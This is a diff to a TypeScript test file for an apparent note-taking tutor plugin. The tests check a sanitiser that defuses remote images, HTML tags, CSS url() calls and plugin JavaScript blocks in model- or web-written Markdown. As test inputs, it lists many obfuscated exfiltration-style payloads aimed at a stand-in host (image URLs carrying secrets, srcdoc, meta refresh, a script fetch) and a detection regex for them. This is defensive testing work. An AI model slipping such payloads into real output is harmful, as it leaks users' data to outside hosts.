@@ -4,7 +4,11 @@ import * as F from "../src/formats";
 import { BUNDLED, buildSystem, buildTurnInput, topicForPrompt, utilityPrompt } from "../src/prompts";
 import { Store } from "../src/store";
 import { Engine, batchMaterial } from "../src/engine";
-import { findClaude } from "../src/claude";
+import { findClaude, workDir } from "../src/claude";
+import { neutraliseDeep, neutraliseRemote } from "../src/safemd";
+import * as fs from "node:fs";
+import * as os from "node:os";
+import * as path from "node:path";
 import { MemFS } from "./memfs";
 
 const COMPILED = `# Linear maps
@@ -448,8 +452,157 @@ test("a summary keeps its Mermaid block in a saved note", async () => {
   assert.match(await fs.read(sheet.path), /tutor: summary[\s\S]*```mermaid/);
 });
 
-test("the Claude CLI is found on this machine", () => {
+// A machine without the CLI (the CI runner) has nothing to find; the lookup itself is still
+// checked wherever the CLI is installed.
+test("the Claude CLI is found on this machine", { skip: findClaude() ? false : "the Claude CLI is not installed here" }, () => {
   const p = findClaude();
   assert.ok(p, "claude should be on PATH or in a known install location");
   assert.ok(!/\.cmd$/i.test(p!), "a .cmd shim must be resolved to the real binary");
+});
+
+// ---------- nothing a model or a web page wrote may load from outside the vault ----------
+
+const TICKS = "`".repeat(3);
+
+test("remote pictures become links, and local ones are left alone", () => {
+  const safe = (s: string) => neutraliseRemote(s);
+  assert.equal(safe("See ![the curve](https://host.example/c.png?d=secret) here."), "See [the curve](https://host.example/c.png?d=secret) here.");
+  assert.equal(safe("![](http://host.example/x)"), "[image](http://host.example/x)", "a link needs text to click");
+  for (const address of ["//host.example/x.png", "\\\\\\\\host\\\\share\\\\x.png", "file://host/share/x.png", "https\\://host.example/x", "&#104;ttps://host.example/x", "<https://host.example/a b>", "HTTPS://HOST.EXAMPLE/x", "ftp://host.example/x"]) {
+    assert.ok(!safe(`a ![x](${address}) b`).includes("!["), `${address} would have been fetched`);
+  }
+  // The address can sit past brackets, code and another picture nested in the label.
+  for (const tricky of ["![a `]` b](https://host.example/x)", "![a ![b](local.png) c](https://host.example/x)", "![a\nb](\nhttps://host.example/x)", "[![x](https://host.example/badge.svg)](https://host.example)"]) {
+    assert.ok(!safe(tricky).includes("!["), tricky);
+  }
+  // Through a reference definition, wherever it is.
+  assert.ok(!safe("![chart][c]\n\ntext\n\n[c]: https://host.example/c.png").includes("!["));
+  assert.ok(!safe("![chart]\n\n> [chart]:\n> https://host.example/c.png").includes("!["));
+
+  for (const local of ["![diagram](attachments/diagram.png)", "![[Kernel diagram.png]]", "![[Note#Section|300]]", "![dot](data:image/png;base64,iVBORw0KGgo//AA==)", "Is $5! [x]$ defined? See [the page](https://host.example).", "[c]: https://host.example/page\n\nRead [this][c]."]) {
+    assert.equal(safe(local), local);
+  }
+});
+
+const STILL_LIVE = /<(?:img|iframe|video|audio|object|embed|link|base|meta|image|div|p|td|a|style|script)\b[^>]*(?:host\.example|rl\()|<(?:style|script)>/i;
+
+test("tags that would fetch something are shown as text, and ordinary markup and maths are untouched", () => {
+  const safe = (s: string) => neutraliseRemote(s);
+  for (const tag of [
+    '<img src="https://host.example/x.png">',
+    "<img src=//host.example/x>",
+    '<img\nsrc="https://host.example/x"\n>',
+    '<IMG SRC="https:host.example/x">',
+    '<img/src="https://host.example/x">',
+    '<img title=">" src="https://host.example/x">',
+    '<img src="ht\ttps://host.example/x">',
+    '<img src="&#104;ttps://host.example/x">',
+    '<img src="x.png" srcset="//host.example/x 2x">',
+    '<iframe src="https://host.example"></iframe>',
+    '<iframe srcdoc="<img src=https://host.example/x>"></iframe>',
+    '<video poster="https://host.example/p.png"></video>',
+    '<audio src="https://host.example/a.mp3"></audio>',
+    '<object data="https://host.example/o"></object>',
+    '<embed src="https://host.example/e">',
+    '<link rel="stylesheet" href="https://host.example/s.css">',
+    '<base href="https://host.example/">',
+    '<meta http-equiv="refresh" content="0;url=https://host.example">',
+    '<svg><image href="https://host.example/x.png"/></svg>',
+    '<div style="background:url(https://host.example/x)">x</div>',
+    "<p style='background-image:\\75rl(x)'>x</p>",
+    '<td background="//host.example/x">x</td>',
+    '<a href="note.md" ping="https://host.example/p">x</a>',
+    "<style>@import 'https://host.example/s.css';</style>",
+    "<script>fetch('https://host.example')</script>",
+  ]) {
+    const out = safe(`Before ${tag} after.`);
+    assert.ok(!STILL_LIVE.test(out), `${tag} is still live in: ${out}`);
+    assert.equal(safe(out), out, "running it again changes nothing");
+  }
+
+  // Whatever it points at, a raw picture tag is shown as text: its attributes are never guessed about.
+  assert.equal(safe('<img src="attachments/diagram.png" alt="A diagram">'), '&lt;img src="attachments/diagram.png" alt="A diagram">');
+  // Quotes that do not pair, a bracket inside a value, a tag never closed, a tag inside another's attribute.
+  for (const odd of ['<img " src=//host.example/x>', "<img src=//host.example/x alt=a<b>", "Before <img src=//host.example/x", '<span title="<img src=//host.example/x>" 5>x</span>', '<div style="background:url(//host.example/x)"']) {
+    assert.ok(!/<(?:img|div)/.test(safe(odd)), `still live: ${safe(odd)}`);
+  }
+  for (const fine of [
+    "<b>bold</b>, <sub>2</sub>, a line<br>break and <details><summary>Hint</summary>Try $n=0$.</details>",
+    '<a href="https://host.example/page">a link</a> and <span style="color:red">red</span>',
+    "When $0<s \\leq 1$ and $t>0$, and if $a<b$ then $\\frac{1}{b}<\\frac{1}{a}$ for $a>0$.",
+    "Is `List<T>` valid? For 0<s = t \\leq 1 and u>0 it holds, and Map<K, V> too.",
+    'Correct.\n<attempt>{"skill":2,"result":"correct","assisted":false}</attempt>\n<verify>[{"type":"equal","a":"x//2","b":"floor(x/2)"}]</verify>\n<state>{"levels":{"2":3},"add_misconceptions":["reads a<b as a>b"]}</state>',
+  ]) {
+    assert.equal(safe(fine), fine);
+  }
+});
+
+test("code stays exactly as written, and code that only looks like code is not trusted", () => {
+  const html = '<img src="https://host.example/x.png">\n![x](https://host.example/y.png)';
+  // A fenced block is code: nothing in it is touched, with or without a blank line before it.
+  for (const block of [`Here it is:\n${TICKS}html\n${html}\n${TICKS}\nDone.`, `Here it is:\n\n~~~~\n${html}\n~~~~\n`, `1. Step one:\n   ${TICKS}html\n   ${html.replace("\n", "\n   ")}\n   ${TICKS}\n2. Step two.`, `${TICKS}\n${html}`]) {
+    assert.equal(neutraliseRemote(block), block);
+  }
+  // Inline code reads the same afterwards, but as an element nothing can be parsed out of.
+  const inline = neutraliseRemote('Use `<img src="https://host.example/x.png">` or `![alt](https://host.example/x.png)` like so. `plain code` stays.');
+  assert.ok(!/<img|!\[/.test(inline));
+  assert.match(inline, /<code>&#60;img src&#61;&#34;https&#58;&#47;&#47;host&#46;example&#47;x&#46;png&#34;&#62;<\/code>/);
+  assert.match(inline, /`plain code` stays\.$/);
+  assert.equal(neutraliseRemote(inline), inline);
+
+  const payload = '<img src="https://host.example/x.png">';
+  for (const fake of [
+    // "```" inside an HTML block is text, so what follows it is live.
+    `<div>\n${TICKS}\n${payload}\n${TICKS}\n</div>`,
+    `<!--\n\n${TICKS}\n--> ${payload}\n${TICKS}`,
+    // A fence under a list item ends with the item, closed or not.
+    `- item\n\n  ${TICKS}\n  code\n${payload}`,
+    // Backticks inside a tag, or across a table cell or a heading, are not code spans.
+    `<span title="\`"> ${payload} <span title="\`">`,
+    `| \`a | ${payload} | b\` |`,
+    `text \`open\n# heading ${payload} \`close`,
+  ]) {
+    const out = neutraliseRemote(fake);
+    assert.ok(!out.includes("<img"), `still live: ${out}`);
+  }
+  // A page's author chooses where its fences fall, so none of a page is skipped.
+  assert.ok(!neutraliseRemote(`~~~\n${payload}\n~~~`, { trustFences: false }).includes("<img"));
+  // A block a plugin would run as JavaScript is relabelled, and so is Dataview's inline form.
+  assert.equal(neutraliseRemote(`${TICKS}dataviewjs\ndv.span(1)\n${TICKS}`), `${TICKS}js\ndv.span(1)\n${TICKS}`);
+  assert.equal(neutraliseRemote(`  - ${TICKS} js-engine\n    1\n    ${TICKS}`), `  - ${TICKS} js\n    1\n    ${TICKS}`);
+  assert.equal(neutraliseRemote("Total: `$= dv.pages().length`"), "Total: `$ = dv.pages().length`");
+});
+
+test("every string of a parsed reply is cleaned, and the plugin's own files pass through unchanged", () => {
+  const reply = { overview: "![x](https://host.example/x.png)", units: [{ name: "Kernel", questions: [{ question: '<img src="https://host.example/q.png"> What is $\\ker T$?', difficulty: 2, options: ["$\\{0\\}$", "`0`"] }] }], url: "https://host.example/page", ok: true, none: null };
+  const clean = neutraliseDeep(reply);
+  assert.equal(clean.overview, "[x](https://host.example/x.png)");
+  assert.equal(clean.units[0].questions[0].question, '&lt;img src="https://host.example/q.png"> What is $\\ker T$?');
+  assert.deepEqual([clean.units[0].questions[0].options, clean.units[0].questions[0].difficulty, clean.url, clean.ok, clean.none], [["$\\{0\\}$", "`0`"], 2, "https://host.example/page", true, null]);
+  // A skill file that changed on the way to the vault would look edited by the user and never be updated again.
+  for (const [name, text] of Object.entries(BUNDLED)) assert.equal(neutraliseRemote(text), text, name);
+  assert.equal(neutraliseRemote(COMPILED), COMPILED);
+});
+
+test("prompt files are written where only this user can read them", () => {
+  const base = fs.mkdtempSync(path.join(os.tmpdir(), "study-tutor-work-"));
+  const taken = fs.mkdtempSync(path.join(os.tmpdir(), "study-tutor-work-"));
+  try {
+    const dir = workDir(base);
+    assert.equal(dir, path.join(base, "study-tutor-cli"));
+    assert.ok(fs.statSync(dir).isDirectory());
+    // Windows has no permission bits to check.
+    if (process.platform !== "win32") assert.equal(fs.statSync(dir).mode & 0o077, 0, "no access for other accounts");
+    assert.equal(workDir(base), dir, "the same folder every time");
+
+    // Something else already sits at that name: a folder made for this run is used instead.
+    fs.writeFileSync(path.join(taken, "study-tutor-cli"), "not a folder");
+    const own = workDir(taken);
+    assert.notEqual(own, path.join(taken, "study-tutor-cli"));
+    assert.ok(fs.statSync(own).isDirectory() && path.dirname(own) === taken);
+    assert.equal(workDir(taken), own);
+  } finally {
+    fs.rmSync(base, { recursive: true, force: true });
+    fs.rmSync(taken, { recursive: true, force: true });
+  }
 });
